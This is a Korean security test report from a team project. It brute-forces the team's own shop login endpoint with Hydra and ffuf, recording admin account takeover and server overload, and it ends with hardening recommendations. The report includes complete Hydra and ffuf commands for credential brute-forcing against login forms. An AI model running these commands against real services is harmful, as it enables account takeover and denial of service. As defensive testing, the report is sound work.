# Brute Force 공격 실험 보고서 (Hydra & ffuf 기반) - 안윤기
> - 3차 팀 프로젝트 : HALO SHOP
> - 결론 : 
>   1. 관리자 세션 인증 방식은 Hydra를 통해 무차별 대입 공격 성공 가능성 존재
>   2. ffuf 도구는 JSON 기반 로그인 구조를 공격 가능하며, 서버에 DOS 수준의 부하를 발생시킬 수 있음
>   3. jwt + json 기반 일반 유저 로그인은 툴 공격에 강함

---

## Hydra 실험

###  실험 환경
- 대상 서버: http://172.xx.xxx.x:8080/auth/login (Spring Boot 백엔드 내 ip라 일단가림)
- 관리자 로그인 방식: `application/x-www-form-urlencoded` + Session + Argon2
- 일반 유저 로그인 방식: `application/json` + JWT + Bcrypt
- 공격 도구: Hydra 9.4
- 사전 파일: 이메일 3,000개 / 패스워드 300개

---

###  공격 시도 1: 실패 (기본 GET 요청)
```bash
hydra -L userlist.txt -P passlist.txt 172.xx.xxx.x http-post-form \
"/auth/login:email=^USER^&password=^PASS^:F=비밀번호가 일치하지 않습니다" -s 8080
```
- 실패 원인: GET 요청으로 보내짐 → 서버는 POST만 처리

---

###  공격 시도 2: POST 요청으로 커스터마이징
```bash
hydra -L userlist.txt -P passlist.txt 172.xx.xxx.x -s 8080 http-post-form \
"/auth/login:email=^USER^&password=^PASS^:F=비밀번호가 일치하지 않습니다"
```
- 요청 방식은 POST로 정상 처리됨
- 일반 유저는 실패 (JSON 형식 + JWT로 Hydra가 공격 불가)
- 관리자 계정은 공격 성공 가능 → 실제 성공 사례 존재

---

### 🔎 트래픽 확인 결과
```powershell
(공격 중)
netstat -an | Select-String "TIME_WAIT" | Measure-Object | Select -ExpandProperty Count
> 10441

(공격 후)
> 10
```
- TIME_WAIT 급증 → 서버 CPU 점유율 100%
- 로그 DB 저장 누락 발생 (INSERT 실패 추정)

---

###  공격 시나리오 스토리텔링
다크웹에서 유출된 이메일·비밀번호 조합을 확보한 공격자는 Hydra를 통해 
`admin1@gmail.com` 계정을 탈취하는 데 성공. 내부 관리 시스템 접근 가능.

---

## ffuf 실험

###  공격 명령어
```bash
ffuf -w userlist.txt:USERNAME -w passlist.txt:PASSWORD \
-X POST \
-d '{{"email":"USERNAME","password":"PASSWORD"}}' \
-H "Content-Type: application/json" \
-u http://172.xx.xxx.x:8080/auth/login \
-mc 200
```
- `application/json` 형식으로 요청 가능 → 일반 유저 공격 가능
- 응답코드 200 기반으로 성공 여부 확인
- 요청 수 × 조합 수 = 수천 ~ 수만 건 → CPU 100%

---

###  부하 테스트 결과
- 공격 1초 만에 CPU 100% 도달
- netstat TIME_WAIT: 6935 → 시스템 마비 직전 수준
- 로그 시스템/DB 모두 과부하

---

## 취약점 분석 요약

| 항목                 | 상태           | 보안 위험                     |
|----------------------|----------------|-------------------------------|
| 로그인 시도 제한     | 없음           | 무한 대입 가능                |
| 관리자 2FA           | 없음           | 계정 탈취 시 완전한 장악 가능 |
| 응답 메시지 차별화   | 있음           | 사용자 존재 여부 노출         |
| CAPTCHA / 난수제한   | 없음           | 자동화 공격 가능              |
| 로그 저장 구조       | DB 직접 저장   | 부하 발생 시 로깅 누락 발생   |

---

## 권고 사항

1. 로그인 시도 제한 로직 도입 (IP 또는 이메일 기준)
2. 관리자 계정: OTP 또는 2차 인증 필수화
3. ffuf/Hydra 공격 감지 로직 도입 및 로그 저장 비동기 처리
4. CAPTCHA 추가 및 응답 메시지 통일
5. 보안 로깅 구조 → 블록체인 로그 또는 비DB 저장 방식 도입 예정

---

*본 실험은 보안 점검을 목적으로 수행되었으며, 악의적 공격에 사용되어서는 안 됩니다.*